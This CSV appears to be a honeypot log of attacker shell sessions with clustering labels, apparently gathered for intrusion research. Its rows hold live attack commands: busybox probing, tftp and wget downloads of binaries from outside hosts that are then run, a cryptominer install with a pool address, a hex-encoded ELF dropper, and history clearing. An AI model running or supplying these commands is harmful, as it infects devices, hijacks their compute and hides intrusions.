session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
2bf7a7c5a915,2,18340,4.213482618331909,13,shell
2bf7a7c5a915,2,18341,4.213482618331909,13,sh
2bf7a7c5a915,2,18342,4.213482618331909,13,cat /proc/mounts; /bin/busybox HBOPZ
2bf7a7c5a915,2,18343,4.213482618331909,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HBOPZ
2bf7a7c5a915,2,18344,4.213482618331909,13,tftp; wget; /bin/busybox HBOPZ
2bf7a7c5a915,2,18345,4.213482618331909,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
2bf7a7c5a915,2,18346,4.213482618331909,13,while read i
2bf7a7c5a915,2,18347,4.213482618331909,13,/bin/busybox HBOPZ
2bf7a7c5a915,2,18348,4.213482618331909,13,rm .s; exit
bc4bb81ecaa0,2,18349,2.92459487915039,13,enable
bc4bb81ecaa0,2,18350,2.92459487915039,13,system
bc4bb81ecaa0,2,18351,2.92459487915039,13,system
bc4bb81ecaa0,2,18352,2.92459487915039,13,shell
bc4bb81ecaa0,2,18353,2.92459487915039,13,shell
bc4bb81ecaa0,2,18354,2.92459487915039,13,sh
bc4bb81ecaa0,2,18355,2.92459487915039,13,cat /proc/mounts; /bin/busybox USIPT
bc4bb81ecaa0,2,18356,2.92459487915039,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox USIPT
bc4bb81ecaa0,2,18357,2.92459487915039,13,tftp; wget; /bin/busybox USIPT
bc4bb81ecaa0,2,18358,2.92459487915039,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
bc4bb81ecaa0,2,18359,2.92459487915039,13,while read i
bc4bb81ecaa0,2,18360,2.92459487915039,13,/bin/busybox USIPT
bc4bb81ecaa0,2,18361,2.92459487915039,13,rm .s; exit
3d72d565eda8,2,18362,32.31681537628174,14,enable
3d72d565eda8,2,18363,32.31681537628174,14,system
3d72d565eda8,2,18364,32.31681537628174,14,system
3d72d565eda8,2,18365,32.31681537628174,14,shell
3d72d565eda8,2,18366,32.31681537628174,14,shell
3d72d565eda8,2,18367,32.31681537628174,14,sh
3d72d565eda8,2,18368,32.31681537628174,14,cat /proc/mounts; /bin/busybox ZRGSG
3d72d565eda8,2,18369,32.31681537628174,14,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZRGSG
3d72d565eda8,2,18370,32.31681537628174,14,tftp; wget; /bin/busybox ZRGSG
3d72d565eda8,2,18371,32.31681537628174,14,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3d72d565eda8,2,18372,32.31681537628174,14,while read i
3d72d565eda8,2,18373,32.31681537628174,14,/bin/busybox ZRGSG
3d72d565eda8,2,18374,32.31681537628174,14,rm .s; tftp -l.i -r.i -g 171.254.206.252:59468; chmod 777 .i; ./.i; exit
3d72d565eda8,2,18375,32.31681537628174,14,./.i
a48a0e6cce54,1,18376,5.091272354125977,11,enable
a48a0e6cce54,1,18377,5.091272354125977,11,system
a48a0e6cce54,1,18378,5.091272354125977,11,system
a48a0e6cce54,1,18379,5.091272354125977,11,shell
a48a0e6cce54,1,18380,5.091272354125977,11,shell
a48a0e6cce54,1,18381,5.091272354125977,11,sh
a48a0e6cce54,1,18382,5.091272354125977,11,linuxshell
a48a0e6cce54,1,18383,5.091272354125977,11,linuxshell
a48a0e6cce54,1,18384,5.091272354125977,11,/bin/busybox TSUNAMI
a48a0e6cce54,1,18385,5.091272354125977,11,/bin/busybox cat /bin/busybox
a48a0e6cce54,1,18386,5.091272354125977,11,cat /bin/busybox
c25d9f213a0f,1,18387,83.64705276489258,9,/ip cloud print
c25d9f213a0f,1,18388,83.64705276489258,9,/ip cloud print
c25d9f213a0f,1,18389,83.64705276489258,9,ifconfig
c25d9f213a0f,1,18390,83.64705276489258,9,uname -a
c25d9f213a0f,1,18391,83.64705276489258,9,cat /proc/cpuinfo
c25d9f213a0f,1,18392,83.64705276489258,9,ps | grep '[Mm]iner'
c25d9f213a0f,1,18393,83.64705276489258,9,ps -ef | grep '[Mm]iner'
c25d9f213a0f,1,18394,83.64705276489258,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
c25d9f213a0f,1,18395,83.64705276489258,9,echo Hi | cat -n
fa4732b8bc80,4,18396,131.74230432510376,11,enable
fa4732b8bc80,4,18397,131.74230432510376,11,system
fa4732b8bc80,4,18398,131.74230432510376,11,system
fa4732b8bc80,4,18399,131.74230432510376,11,shell
fa4732b8bc80,4,18400,131.74230432510376,11,shell
fa4732b8bc80,4,18401,131.74230432510376,11,sh
fa4732b8bc80,4,18402,131.74230432510376,11,/bin/busybox VENUSZUELA
fa4732b8bc80,4,18403,131.74230432510376,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
fa4732b8bc80,4,18404,131.74230432510376,11,cat /bin/busybox
fa4732b8bc80,4,18405,131.74230432510376,11,while read i
fa4732b8bc80,4,18406,131.74230432510376,11,dd if=/bin/busybox bs=22 count=1
4fba9962e9c1,2,18407,3.258956432342529,13,enable
4fba9962e9c1,2,18408,3.258956432342529,13,system
4fba9962e9c1,2,18409,3.258956432342529,13,system
4fba9962e9c1,2,18410,3.258956432342529,13,shell
4fba9962e9c1,2,18411,3.258956432342529,13,shell
4fba9962e9c1,2,18412,3.258956432342529,13,sh
4fba9962e9c1,2,18413,3.258956432342529,13,cat /proc/mounts; /bin/busybox KIOHU
4fba9962e9c1,2,18414,3.258956432342529,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KIOHU
4fba9962e9c1,2,18415,3.258956432342529,13,tftp; wget; /bin/busybox KIOHU
4fba9962e9c1,2,18416,3.258956432342529,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
4fba9962e9c1,2,18417,3.258956432342529,13,while read i
4fba9962e9c1,2,18418,3.258956432342529,13,/bin/busybox KIOHU
4fba9962e9c1,2,18419,3.258956432342529,13,rm .s; exit
6a1d04064b01,0,18420,1.9875855445861808,1,cd /tmp ; mkdir .x ; cd .x ; wget http://20.106.163.35/cnrig ; curl -O http://20.106.163.35/cnrig ; chmod +x cnrig ; mv cnrig systemd ; ./systemd -o 37.187.95.110:443 -u 8ALdP9yTXenfNjgpm5TrRf7TGoBr8aUKU3kQcu7CLzfVJZYMXTohVb85GrRu7dy8PsTYrcisdG9LdMTmkuPRdZN7CnFsVWB -k --tls -p MinerCox -B ; echo DONE
f245a4f85e50,2,18421,16.28535223007202,13,enable
f245a4f85e50,2,18422,16.28535223007202,13,system
f245a4f85e50,2,18423,16.28535223007202,13,system
f245a4f85e50,2,18424,16.28535223007202,13,shell
f245a4f85e50,2,18425,16.28535223007202,13,shell
f245a4f85e50,2,18426,16.28535223007202,13,sh
f245a4f85e50,2,18427,16.28535223007202,13,cat /proc/mounts; /bin/busybox COVCV
f245a4f85e50,2,18428,16.28535223007202,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox COVCV
f245a4f85e50,2,18429,16.28535223007202,13,tftp; wget; /bin/busybox COVCV
f245a4f85e50,2,18430,16.28535223007202,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
f245a4f85e50,2,18431,16.28535223007202,13,while read i
f245a4f85e50,2,18432,16.28535223007202,13,/bin/busybox COVCV
f245a4f85e50,2,18433,16.28535223007202,13,rm .s; exit
22a56e09e14e,0,18434,3.399082899093628,19,start
22a56e09e14e,0,18435,3.399082899093628,19,start
22a56e09e14e,0,18436,3.399082899093628,19,enable
22a56e09e14e,0,18437,3.399082899093628,19,config terminal
22a56e09e14e,0,18438,3.399082899093628,19,config terminal
22a56e09e14e,0,18439,3.399082899093628,19,system
22a56e09e14e,0,18440,3.399082899093628,19,system
22a56e09e14e,0,18441,3.399082899093628,19,linuxshell
22a56e09e14e,0,18442,3.399082899093628,19,linuxshell
22a56e09e14e,0,18443,3.399082899093628,19,su
22a56e09e14e,0,18444,3.399082899093628,19,shell
22a56e09e14e,0,18445,3.399082899093628,19,shell
22a56e09e14e,0,18446,3.399082899093628,19,sh
22a56e09e14e,0,18447,3.399082899093628,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
22a56e09e14e,0,18448,3.399082899093628,19,echo -ne \x45\x4c\x46
22a56e09e14e,0,18449,3.399082899093628,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
22a56e09e14e,0,18450,3.399082899093628,19,wget
22a56e09e14e,0,18451,3.399082899093628,19,echo -ne \x45\x4c\x46
22a56e09e14e,0,18452,3.399082899093628,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
4775cbbec68e,1,18453,0.393909454345703,1,nproc;uname -a
e116e88050a2,1,18454,1.682746648788452,1,(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
1ce093dd0cc2,2,18455,1.9447729587554927,13,enable
1ce093dd0cc2,2,18456,1.9447729587554927,13,system
1ce093dd0cc2,2,18457,1.9447729587554927,13,system
1ce093dd0cc2,2,18458,1.9447729587554927,13,shell
1ce093dd0cc2,2,18459,1.9447729587554927,13,shell
1ce093dd0cc2,2,18460,1.9447729587554927,13,sh
1ce093dd0cc2,2,18461,1.9447729587554927,13,cat /proc/mounts; /bin/busybox XUDMD
1ce093dd0cc2,2,18462,1.9447729587554927,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XUDMD
1ce093dd0cc2,2,18463,1.9447729587554927,13,tftp; wget; /bin/busybox XUDMD
1ce093dd0cc2,2,18464,1.9447729587554927,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
1ce093dd0cc2,2,18465,1.9447729587554927,13,while read i
1ce093dd0cc2,2,18466,1.9447729587554927,13,/bin/busybox XUDMD
1ce093dd0cc2,2,18467,1.9447729587554927,13,rm .s; exit
a1ad4feb6064,1,18468,0.352463245391845,1,sudo hive-passwd a9s9d92919s9d91ndsaji1; sudo pkill Xorg; sudo pkill x11vnc; sudo service shellinabox stop; echo pedal; uname -a; history -c
81f54321a34b,2,18469,5.138456583023071,13,enable
81f54321a34b,2,18470,5.138456583023071,13,system
81f54321a34b,2,18471,5.138456583023071,13,system
81f54321a34b,2,18472,5.138456583023071,13,shell
81f54321a34b,2,18473,5.138456583023071,13,shell
81f54321a34b,2,18474,5.138456583023071,13,sh
81f54321a34b,2,18475,5.138456583023071,13,cat /proc/mounts; /bin/busybox ZGQCC
81f54321a34b,2,18476,5.138456583023071,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZGQCC
81f54321a34b,2,18477,5.138456583023071,13,tftp; wget; /bin/busybox ZGQCC
81f54321a34b,2,18478,5.138456583023071,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
81f54321a34b,2,18479,5.138456583023071,13,while read i
81f54321a34b,2,18480,5.138456583023071,13,/bin/busybox ZGQCC
81f54321a34b,2,18481,5.138456583023071,13,rm .s; exit
0ea2ab5f69f2,1,18482,0.311150789260864,1,sudo hive-passwd a9s9d92919s9d91ndsaji1; sudo pkill Xorg; sudo pkill x11vnc; sudo service shellinabox stop; echo pedal; uname -a; history -c
20e5e8dc9451,2,18483,33.45359563827515,14,enable
20e5e8dc9451,2,18484,33.45359563827515,14,system
20e5e8dc9451,2,18485,33.45359563827515,14,system
20e5e8dc9451,2,18486,33.45359563827515,14,shell
20e5e8dc9451,2,18487,33.45359563827515,14,shell
20e5e8dc9451,2,18488,33.45359563827515,14,sh
20e5e8dc9451,2,18489,33.45359563827515,14,cat /proc/mounts; /bin/busybox KNARF
20e5e8dc9451,2,18490,33.45359563827515,14,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KNARF
20e5e8dc9451,2,18491,33.45359563827515,14,tftp; wget; /bin/busybox KNARF
20e5e8dc9451,2,18492,33.45359563827515,14,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
20e5e8dc9451,2,18493,33.45359563827515,14,while read i
20e5e8dc9451,2,18494,33.45359563827515,14,/bin/busybox KNARF
20e5e8dc9451,2,18495,33.45359563827515,14,rm .s; tftp -l.i -r.i -g 191.53.153.35:27406; chmod 777 .i; ./.i; exit
20e5e8dc9451,2,18496,33.45359563827515,14,./.i
5aa7b90dba46,2,18497,3.714873790740967,13,enable
5aa7b90dba46,2,18498,3.714873790740967,13,system
5aa7b90dba46,2,18499,3.714873790740967,13,system
5aa7b90dba46,2,18500,3.714873790740967,13,shell
5aa7b90dba46,2,18501,3.714873790740967,13,shell
5aa7b90dba46,2,18502,3.714873790740967,13,sh
5aa7b90dba46,2,18503,3.714873790740967,13,cat /proc/mounts; /bin/busybox SYJKB
5aa7b90dba46,2,18504,3.714873790740967,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SYJKB
5aa7b90dba46,2,18505,3.714873790740967,13,tftp; wget; /bin/busybox SYJKB
5aa7b90dba46,2,18506,3.714873790740967,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
5aa7b90dba46,2,18507,3.714873790740967,13,while read i
5aa7b90dba46,2,18508,3.714873790740967,13,/bin/busybox SYJKB
5aa7b90dba46,2,18509,3.714873790740967,13,rm .s; exit
3621b03fabaf,2,18510,2.643332481384277,13,enable
3621b03fabaf,2,18511,2.643332481384277,13,system
3621b03fabaf,2,18512,2.643332481384277,13,system
3621b03fabaf,2,18513,2.643332481384277,13,shell
3621b03fabaf,2,18514,2.643332481384277,13,shell
3621b03fabaf,2,18515,2.643332481384277,13,sh
3621b03fabaf,2,18516,2.643332481384277,13,cat /proc/mounts; /bin/busybox DMGDA
3621b03fabaf,2,18517,2.643332481384277,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DMGDA
3621b03fabaf,2,18518,2.643332481384277,13,tftp; wget; /bin/busybox DMGDA
3621b03fabaf,2,18519,2.643332481384277,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3621b03fabaf,2,18520,2.643332481384277,13,while read i
3621b03fabaf,2,18521,2.643332481384277,13,/bin/busybox DMGDA
3621b03fabaf,2,18522,2.643332481384277,13,rm .s; exit
1b97855df680,1,18523,2.945847988128662,1,cat /proc/uptime
9491944f7d48,2,18524,2.824412822723388,24,enable
9491944f7d48,2,18525,2.824412822723388,24,system
9491944f7d48,2,18526,2.824412822723388,24,system
9491944f7d48,2,18527,2.824412822723388,24,shell
9491944f7d48,2,18528,2.824412822723388,24,shell
9491944f7d48,2,18529,2.824412822723388,24,sh
9491944f7d48,2,18530,2.824412822723388,24,cat /proc/mounts; /bin/busybox GGCKW
9491944f7d48,2,18531,2.824412822723388,24,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GGCKW
9491944f7d48,2,18532,2.824412822723388,24,tftp; wget; /bin/busybox GGCKW
9491944f7d48,2,18533,2.824412822723388,24,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
9491944f7d48,2,18534,2.824412822723388,24,while read i
9491944f7d48,2,18535,2.824412822723388,24,/bin/busybox GGCKW
9491944f7d48,2,18536,2.824412822723388,24,>.s; cp .s .i
9491944f7d48,2,18537,2.824412822723388,24,"echo -ne ""\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x00\xb0\x00\x00\x00\x34\x00\x00\x01\x64\x00\x00\x10\x06\x00\x34\x00\x20\x00\x02\x00\x28\x00\x03\x00\x02\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" >> .s"
9491944f7d48,2,18538,2.824412822723388,24,"echo -ne ""\x00\x40\x00\x94\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x01\x50\x00\x00\x01\x50\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" >> .s"
9491944f7d48,2,18539,2.824412822723388,24,"echo -ne ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x02\x00\x01\xaf\xa2\xff\xd4\x24\x0f\xff\xfd\x01\xe0\x28\x27"" >> .s"
9491944f7d48,2,18540,2.824412822723388,24,"echo -ne ""\xaf\xa5\xff\xe2\x8f\xa4\xff\xe2\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x04\xd0\xff\xff\x00\x00\x00\x00\x27\xe5\x00\x58\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x28\x06\xff\xff\x8f\xa4\xff\xd4"" >> .s"
9491944f7d48,2,18541,2.824412822723388,24,"echo -ne ""\x27\xa5\xff\xd0\x24\x02\x0f\xa4\x01\x01\x01\x0c\x8f\xa4\xff\xff\x27\xa5\xff\xd0\x28\x06\x00\xff\x24\x02\x0f\xa3\x01\x01\x01\x0c\x18\x40\x00\x03\x00\x00\x00\x00\x10\xe0\xff\xf4\x00\x00\x00\x00\x24\x04\x00\x00\x24\x02\x0f\xa1\x01\x09\x09\x0c\x00\x02\xe3\x6c"" >> .s"
9491944f7d48,2,18542,2.824412822723388,24,"echo -ne ""\xc5\xe8\x55\xa3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" >> .s"
9491944f7d48,2,18543,2.824412822723388,24,"echo -ne ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\xb0\x00\x00\x00\xb0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00"" >> .s"
9491944f7d48,2,18544,2.824412822723388,24,"echo -ne ""\x00\x00\x00\x00\x00\x00\x01\x50\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00"" >> .s"
9491944f7d48,2,18545,2.824412822723388,24,./.s>.i; chmod 777 .i; ./.i; rm .s; exit
9491944f7d48,2,18546,2.824412822723388,24,./.s > .i
9491944f7d48,2,18547,2.824412822723388,24,./.i
e258a588e2c9,1,18548,46.2230806350708,8,shell
e258a588e2c9,1,18549,46.2230806350708,8,shell
e258a588e2c9,1,18550,46.2230806350708,8,\n
e258a588e2c9,1,18551,46.2230806350708,8,n
e258a588e2c9,1,18552,46.2230806350708,8,uname -r
e258a588e2c9,1,18553,46.2230806350708,8,id
e258a588e2c9,1,18554,46.2230806350708,8,id
e258a588e2c9,1,18555,46.2230806350708,8,ls -la /usr/bin/curl
c3140d4ebe6c,0,18556,60.22137951850891,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://greektaverna.tk/sh; curl -O http://greektaverna.tk/sh; chmod 777 sh; sh sh; tftp greektaverna.tk -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g greektaverna.tk; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 greektaverna.tk .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
69774927eb0d,2,18557,3.860975980758667,13,enable
69774927eb0d,2,18558,3.860975980758667,13,system
69774927eb0d,2,18559,3.860975980758667,13,system
69774927eb0d,2,18560,3.860975980758667,13,shell
69774927eb0d,2,18561,3.860975980758667,13,shell
69774927eb0d,2,18562,3.860975980758667,13,sh
69774927eb0d,2,18563,3.860975980758667,13,cat /proc/mounts; /bin/busybox CPTEF
69774927eb0d,2,18564,3.860975980758667,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CPTEF
69774927eb0d,2,18565,3.860975980758667,13,tftp; wget; /bin/busybox CPTEF
69774927eb0d,2,18566,3.860975980758667,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
69774927eb0d,2,18567,3.860975980758667,13,while read i
69774927eb0d,2,18568,3.860975980758667,13,/bin/busybox CPTEF
69774927eb0d,2,18569,3.860975980758667,13,rm .s; exit
e58c3fd179a0,2,18570,1.00198745727539,13,enable
e58c3fd179a0,2,18571,1.00198745727539,13,system
e58c3fd179a0,2,18572,1.00198745727539,13,system
e58c3fd179a0,2,18573,1.00198745727539,13,shell
e58c3fd179a0,2,18574,1.00198745727539,13,shell
e58c3fd179a0,2,18575,1.00198745727539,13,sh
e58c3fd179a0,2,18576,1.00198745727539,13,cat /proc/mounts; /bin/busybox OFGYF
e58c3fd179a0,2,18577,1.00198745727539,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OFGYF
e58c3fd179a0,2,18578,1.00198745727539,13,tftp; wget; /bin/busybox OFGYF
e58c3fd179a0,2,18579,1.00198745727539,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e58c3fd179a0,2,18580,1.00198745727539,13,while read i
e58c3fd179a0,2,18581,1.00198745727539,13,/bin/busybox OFGYF
e58c3fd179a0,2,18582,1.00198745727539,13,rm .s; exit
fde04d21339f,4,18583,102.96272945404051,12,enable
fde04d21339f,4,18584,102.96272945404051,12,system
fde04d21339f,4,18585,102.96272945404051,12,system
fde04d21339f,4,18586,102.96272945404051,12,shell
fde04d21339f,4,18587,102.96272945404051,12,shell
fde04d21339f,4,18588,102.96272945404051,12,sh
fde04d21339f,4,18589,102.96272945404051,12,cat /proc/mounts; /bin/busybox QMXGK
fde04d21339f,4,18590,102.96272945404051,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QMXGK
fde04d21339f,4,18591,102.96272945404051,12,tftp; wget; /bin/busybox QMXGK
fde04d21339f,4,18592,102.96272945404051,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
fde04d21339f,4,18593,102.96272945404051,12,while read i
fde04d21339f,4,18594,102.96272945404051,12,/bin/busybox QMXGK
52a8156a0273,1,18595,172.22311758995056,9,/ip cloud print
52a8156a0273,1,18596,172.22311758995056,9,/ip cloud print
52a8156a0273,1,18597,172.22311758995056,9,ifconfig
52a8156a0273,1,18598,172.22311758995056,9,uname -a
52a8156a0273,1,18599,172.22311758995056,9,cat /proc/cpuinfo
52a8156a0273,1,18600,172.22311758995056,9,ps | grep '[Mm]iner'
52a8156a0273,1,18601,172.22311758995056,9,ps -ef | grep '[Mm]iner'
52a8156a0273,1,18602,172.22311758995056,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
52a8156a0273,1,18603,172.22311758995056,9,echo Hi | cat -n
354dcd4fe781,2,18604,1.44289231300354,13,enable
354dcd4fe781,2,18605,1.44289231300354,13,system
354dcd4fe781,2,18606,1.44289231300354,13,system
354dcd4fe781,2,18607,1.44289231300354,13,shell
354dcd4fe781,2,18608,1.44289231300354,13,shell
354dcd4fe781,2,18609,1.44289231300354,13,sh
354dcd4fe781,2,18610,1.44289231300354,13,cat /proc/mounts; /bin/busybox QSBSM
354dcd4fe781,2,18611,1.44289231300354,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QSBSM
354dcd4fe781,2,18612,1.44289231300354,13,tftp; wget; /bin/busybox QSBSM
354dcd4fe781,2,18613,1.44289231300354,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
354dcd4fe781,2,18614,1.44289231300354,13,while read i
354dcd4fe781,2,18615,1.44289231300354,13,/bin/busybox QSBSM
354dcd4fe781,2,18616,1.44289231300354,13,rm .s; exit
b27b9e416bf0,2,18617,2.011327505111694,13,enable
b27b9e416bf0,2,18618,2.011327505111694,13,system
b27b9e416bf0,2,18619,2.011327505111694,13,system
b27b9e416bf0,2,18620,2.011327505111694,13,shell
b27b9e416bf0,2,18621,2.011327505111694,13,shell
b27b9e416bf0,2,18622,2.011327505111694,13,sh
b27b9e416bf0,2,18623,2.011327505111694,13,cat /proc/mounts; /bin/busybox FHABA
b27b9e416bf0,2,18624,2.011327505111694,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FHABA
b27b9e416bf0,2,18625,2.011327505111694,13,tftp; wget; /bin/busybox FHABA
b27b9e416bf0,2,18626,2.011327505111694,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
b27b9e416bf0,2,18627,2.011327505111694,13,while read i
b27b9e416bf0,2,18628,2.011327505111694,13,/bin/busybox FHABA
b27b9e416bf0,2,18629,2.011327505111694,13,rm .s; exit
d5ad6281fa57,2,18630,3.5623104572296143,13,enable
d5ad6281fa57,2,18631,3.5623104572296143,13,system
d5ad6281fa57,2,18632,3.5623104572296143,13,system
d5ad6281fa57,2,18633,3.5623104572296143,13,shell
d5ad6281fa57,2,18634,3.5623104572296143,13,shell
d5ad6281fa57,2,18635,3.5623104572296143,13,sh
d5ad6281fa57,2,18636,3.5623104572296143,13,cat /proc/mounts; /bin/busybox AEWFE
d5ad6281fa57,2,18637,3.5623104572296143,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AEWFE
d5ad6281fa57,2,18638,3.5623104572296143,13,tftp; wget; /bin/busybox AEWFE
d5ad6281fa57,2,18639,3.5623104572296143,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d5ad6281fa57,2,18640,3.5623104572296143,13,while read i
d5ad6281fa57,2,18641,3.5623104572296143,13,/bin/busybox AEWFE
d5ad6281fa57,2,18642,3.5623104572296143,13,rm .s; exit
83fcb7d3cfad,1,18643,1.636165857315063,1,(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
081983eb6c2d,2,18644,1.403201818466186,13,enable
081983eb6c2d,2,18645,1.403201818466186,13,system
081983eb6c2d,2,18646,1.403201818466186,13,system
081983eb6c2d,2,18647,1.403201818466186,13,shell
081983eb6c2d,2,18648,1.403201818466186,13,shell
081983eb6c2d,2,18649,1.403201818466186,13,sh
081983eb6c2d,2,18650,1.403201818466186,13,cat /proc/mounts; /bin/busybox ACUZK
081983eb6c2d,2,18651,1.403201818466186,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ACUZK
081983eb6c2d,2,18652,1.403201818466186,13,tftp; wget; /bin/busybox ACUZK
081983eb6c2d,2,18653,1.403201818466186,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
081983eb6c2d,2,18654,1.403201818466186,13,while read i
081983eb6c2d,2,18655,1.403201818466186,13,/bin/busybox ACUZK
